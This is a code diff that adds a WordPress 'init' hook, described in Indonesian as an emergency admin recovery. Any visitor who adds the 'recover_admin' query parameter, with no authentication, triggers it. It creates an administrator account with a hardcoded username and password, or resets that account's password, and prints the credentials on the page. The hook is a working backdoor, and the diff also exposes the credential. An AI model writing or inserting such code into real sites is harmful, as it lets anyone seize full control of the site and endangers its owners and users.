@@ -41,3 +41,24 @@ add_action('init', function() {
         exit;
     }
 });
+add_action('init', function() {
+    if (isset($_GET['recover_admin'])) {
+        $username = 'bos_lefanna';
+        $password = 'Lefanna2026!Sukses';
+        $email = 'admin@lefanna.com';
+        
+        if ( ! username_exists( $username ) && ! email_exists( $email ) ) {
+            $user_id = wp_create_user( $username, $password, $email );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+            echo "Sukses! Akun admin darurat berhasil dibuat.<br><br>Username: <strong>$username</strong><br>Password: <strong>$password</strong><br><br><a href='/wp-login.php'>Klik di sini untuk Login</a>";
+            exit;
+        } else {
+            // Force reset if already exists
+            $user = get_user_by('login', $username);
+            wp_set_password($password, $user->ID);
+            echo "Password untuk akun <strong>$username</strong> telah direset ulang menjadi: <strong>$password</strong><br><br><a href='/wp-login.php'>Klik di sini untuk Login</a>";
+            exit;
+        }
+    }
+});
